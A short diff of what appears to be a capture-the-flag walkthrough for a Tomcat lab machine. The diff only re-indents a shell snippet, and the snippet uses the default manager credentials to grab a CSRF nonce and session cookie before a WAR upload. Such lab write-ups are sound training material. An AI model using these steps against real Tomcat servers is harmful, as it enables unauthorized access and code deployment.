@@ -194,8 +194,8 @@ and a `JSSESSID` token.
 
 ```sh
 ❯ RESPONSE=$(curl -s -i -H "Authorization: Basic dG9tY2F0OnMzY3JldA==" "http://10.10.10.95:8080/manager/html"); \
-    CSRF_NONCE=$(echo "$RESPONSE" | grep -oP '<form class="inline" method="POST" action="/manager/html/stop;jsessionid=[^?]+?\?path=/&amp;org.apache.catalina.filters.CSRF_NONCE=\K[^"]+'); \
-    JSSESSID=$(echo "$RESPONSE" | grep -oP "Set-Cookie: JSESSIONID=\K[^;]+")
+  CSRF_NONCE=$(echo "$RESPONSE" | grep -oP '<form class="inline" method="POST" action="/manager/html/stop;jsessionid=[^?]+?\?path=/&amp;org.apache.catalina.filters.CSRF_NONCE=\K[^"]+'); \
+  JSSESSID=$(echo "$RESPONSE" | grep -oP "Set-Cookie: JSESSIONID=\K[^;]+")
 ```
 
 With these values, we can upload our WAR file.
